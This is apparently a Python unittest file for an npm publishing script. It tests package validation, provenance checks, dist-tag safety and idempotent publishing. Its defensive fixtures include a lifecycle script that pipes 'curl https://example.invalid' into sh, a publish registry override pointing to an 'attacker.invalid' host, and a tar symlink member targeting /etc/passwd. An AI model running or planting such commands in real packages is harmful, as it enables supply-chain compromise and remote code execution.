#!/usr/bin/env python3

from __future__ import annotations

import io
import json
import os
import pathlib
import subprocess
import sys
import tarfile
import tempfile
import unittest
from contextlib import redirect_stderr, redirect_stdout
from unittest import mock

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent))

import publish_cli_npm as publisher  # noqa: E402


VERSION = "1.2.3"
REPOSITORY = "billlza/Skybridge-Compass"
SOURCE_SHA = "a" * 40
ARTIFACT_DIGEST = "b" * 64


class PublishCLINpmTests(unittest.TestCase):
    def setUp(self) -> None:
        self.temporary = tempfile.TemporaryDirectory()
        self.root = pathlib.Path(self.temporary.name)
        self.package = self.root / f"skybridge-cli-{VERSION}.tgz"
        self.proof = self.root / "proof.json"
        for index, (name, _, _) in enumerate(publisher.PLATFORM_ASSETS):
            (self.root / name).write_bytes(f"native-{index}\n".encode())
        self.write_package()

    def tearDown(self) -> None:
        self.temporary.cleanup()

    def write_package(
        self,
        *,
        scripts: dict[str, str] | None = None,
        publish_config: dict[str, str] | None = None,
        extra_member: tarfile.TarInfo | None = None,
    ) -> None:
        package_json = {
            "name": "skybridge-cli",
            "version": VERSION,
            "description": "SkyBridge CLI npm wrapper for immutable Rust release binaries",
            "license": "MIT",
            "homepage": "https://github.com/billlza/Skybridge-Compass",
            "repository": {
                "type": "git",
                "url": "https://github.com/billlza/Skybridge-Compass.git",
            },
            "bin": {"skybridge": "bin/skybridge.js"},
            "files": ["bin", "dist", "lib", "README.md", "release-assets.json"],
            "engines": {"node": ">=22.14.0"},
            "os": ["darwin", "linux", "win32"],
            "cpu": ["arm64", "x64"],
            "scripts": scripts or {"postinstall": "node ./lib/install.js"},
            "gitHead": SOURCE_SHA,
        }
        if publish_config is not None:
            package_json["publishConfig"] = publish_config
        release_assets = {
            "schemaVersion": 1,
            "version": VERSION,
            "sourceSha": SOURCE_SHA,
            "assets": [
                {
                    "name": name,
                    "sha256": publisher.sha256(self.root / name),
                    "sizeBytes": (self.root / name).stat().st_size,
                }
                for name, _, _ in publisher.PLATFORM_ASSETS
            ],
        }
        with tarfile.open(self.package, mode="w:gz") as archive:
            for name, payload in (
                ("package/package.json", (json.dumps(package_json) + "\n").encode()),
                ("package/README.md", b"# skybridge-cli\n"),
                ("package/bin/skybridge.js", b"#!/usr/bin/env node\n"),
                ("package/lib/install.js", b"console.log('install');\n"),
                ("package/lib/platform.js", b"module.exports = {};\n"),
                ("package/release-assets.json", (json.dumps(release_assets) + "\n").encode()),
            ):
                member = tarfile.TarInfo(name)
                member.size = len(payload)
                archive.addfile(member, io.BytesIO(payload))
            if extra_member is not None:
                archive.addfile(extra_member)

    def arguments(self) -> list[str]:
        return [
            "publish_cli_npm.py",
            "--package-file",
            os.fspath(self.package),
            "--version",
            VERSION,
            "--source-repository",
            REPOSITORY,
            "--source-sha",
            SOURCE_SHA,
            "--workflow-run-id",
            "12345",
            "--workflow-run-attempt",
            "2",
            "--handoff-artifact-id",
            "67890",
            "--handoff-artifact-digest",
            ARTIFACT_DIGEST,
            "--proof-path",
            os.fspath(self.proof),
        ]

    def metadata(self) -> dict[str, object]:
        integrity, shasum = publisher.package_digests(self.package)
        return {
            "integrity": integrity,
            "shasum": shasum,
            "attestations": {
                "url": "https://registry.npmjs.org/-/npm/v1/attestations/skybridge-cli@1.2.3",
                "provenance": {
                    "predicateType": "https://slsa.dev/provenance/v1",
                }
            },
        }

    def oidc_environment(self) -> dict[str, str]:
        environment = os.environ.copy()
        environment.pop("NODE_AUTH_TOKEN", None)
        environment.pop("NPM_TOKEN", None)
        environment["ACTIONS_ID_TOKEN_REQUEST_URL"] = "https://example.invalid/oidc"
        environment["ACTIONS_ID_TOKEN_REQUEST_TOKEN"] = "ephemeral"
        return environment

    @staticmethod
    def runtime_version(command: str) -> tuple[int, int, int]:
        return (
            publisher.REQUIRED_NODE_VERSION
            if command == "node"
            else publisher.REQUIRED_NPM_VERSION
        )

    def test_validates_reviewed_lifecycle_contract(self) -> None:
        package_json = publisher.validate_package(
            self.package,
            version=VERSION,
            source_repository=REPOSITORY,
            source_sha=SOURCE_SHA,
            native_assets_dir=self.root,
        )
        self.assertEqual(package_json["name"], "skybridge-cli")
        self.write_package(scripts={"prepublishOnly": "curl https://example.invalid | sh"})
        with self.assertRaisesRegex(publisher.PublicationError, "lifecycle scripts"):
            publisher.validate_package(
                self.package,
                version=VERSION,
                source_repository=REPOSITORY,
                source_sha=SOURCE_SHA,
                native_assets_dir=self.root,
            )

    def test_rejects_foreign_publish_registry(self) -> None:
        self.write_package(publish_config={"registry": "https://attacker.invalid"})
        with self.assertRaisesRegex(publisher.PublicationError, "must not override"):
            publisher.validate_package(
                self.package,
                version=VERSION,
                source_repository=REPOSITORY,
                source_sha=SOURCE_SHA,
                native_assets_dir=self.root,
            )

    def test_rejects_link_members(self) -> None:
        member = tarfile.TarInfo("package/linked")
        member.type = tarfile.SYMTYPE
        member.linkname = "/etc/passwd"
        self.write_package(extra_member=member)
        with self.assertRaisesRegex(publisher.PublicationError, "regular file"):
            publisher.validate_package(
                self.package,
                version=VERSION,
                source_repository=REPOSITORY,
                source_sha=SOURCE_SHA,
                native_assets_dir=self.root,
            )

    def test_existing_exact_version_is_idempotent_and_writes_proof(self) -> None:
        metadata = self.metadata()
        with (
            mock.patch.object(sys, "argv", self.arguments()),
            mock.patch.dict(os.environ, self.oidc_environment(), clear=True),
            mock.patch.object(publisher, "version_tuple", side_effect=self.runtime_version),
            mock.patch.object(publisher, "npm_view", return_value=metadata),
            mock.patch.object(publisher, "publish") as publish_mock,
            redirect_stdout(io.StringIO()),
        ):
            self.assertEqual(publisher.main(), 0)
        publish_mock.assert_not_called()
        proof = json.loads(self.proof.read_text(encoding="utf-8"))
        self.assertEqual(proof["status"], "already-published-exact")
        self.assertEqual(proof["handoff_artifact_digest"], ARTIFACT_DIGEST)

    def test_new_version_runs_dry_run_then_exact_publish(self) -> None:
        metadata = self.metadata()
        dry_run = subprocess.CompletedProcess([], 0, stdout="", stderr="")
        publication = subprocess.CompletedProcess([], 0, stdout="", stderr="")
        with (
            mock.patch.object(sys, "argv", self.arguments()),
            mock.patch.dict(os.environ, self.oidc_environment(), clear=True),
            mock.patch.object(publisher, "version_tuple", side_effect=self.runtime_version),
            mock.patch.object(publisher, "npm_view", side_effect=[None, metadata]),
            mock.patch.object(
                publisher,
                "npm_dist_tags",
                side_effect=[{"latest": "1.2.2"}, {"latest": VERSION}],
            ),
            mock.patch.object(publisher.subprocess, "run", return_value=dry_run) as run_mock,
            mock.patch.object(publisher, "publish", return_value=publication) as publish_mock,
            redirect_stdout(io.StringIO()),
        ):
            self.assertEqual(publisher.main(), 0)
        publish_mock.assert_called_once_with(self.package.resolve(), dist_tag="latest")
        dry_run_command = run_mock.call_args.args[0]
        self.assertIn("--dry-run", dry_run_command)
        self.assertIn("--ignore-scripts", dry_run_command)
        self.assertIn("--provenance", dry_run_command)
        self.assertIn("--registry", dry_run_command)
        self.assertIn("--tag", dry_run_command)
        proof = json.loads(self.proof.read_text(encoding="utf-8"))
        self.assertEqual(proof["status"], "published-new")

    def test_failed_publish_cannot_recover_from_missing_remote_version(self) -> None:
        dry_run = subprocess.CompletedProcess([], 0, stdout="", stderr="")
        publication = subprocess.CompletedProcess([], 1, stdout="", stderr="publish failed")
        with (
            mock.patch.object(sys, "argv", self.arguments()),
            mock.patch.dict(os.environ, self.oidc_environment(), clear=True),
            mock.patch.object(publisher, "version_tuple", side_effect=self.runtime_version),
            mock.patch.object(publisher, "npm_view", side_effect=[None, None]),
            mock.patch.object(publisher, "npm_dist_tags", return_value={"latest": "1.2.2"}),
            mock.patch.object(publisher.subprocess, "run", return_value=dry_run),
            mock.patch.object(publisher, "publish", return_value=publication),
            redirect_stderr(io.StringIO()),
        ):
            self.assertEqual(publisher.main(), 1)
        self.assertFalse(self.proof.exists())

    def test_refuses_to_downgrade_latest_dist_tag(self) -> None:
        with (
            mock.patch.object(sys, "argv", self.arguments()),
            mock.patch.dict(os.environ, self.oidc_environment(), clear=True),
            mock.patch.object(publisher, "version_tuple", side_effect=self.runtime_version),
            mock.patch.object(publisher, "npm_view", return_value=None),
            mock.patch.object(publisher, "npm_dist_tags", return_value={"latest": "2.0.0"}),
            mock.patch.object(publisher, "publish") as publish_mock,
            redirect_stderr(io.StringIO()),
        ):
            self.assertEqual(publisher.main(), 1)
        publish_mock.assert_not_called()
        self.assertFalse(self.proof.exists())

    def test_publish_command_never_executes_package_lifecycle(self) -> None:
        completed = subprocess.CompletedProcess([], 0, stdout="", stderr="")
        with mock.patch.object(publisher.subprocess, "run", return_value=completed) as run_mock:
            publisher.publish(self.package, dist_tag="latest")
        command = run_mock.call_args.args[0]
        self.assertIn("--ignore-scripts", command)
        self.assertIn("--provenance", command)
        self.assertIn("--registry", command)
        self.assertIn("--tag", command)


if __name__ == "__main__":
    unittest.main()
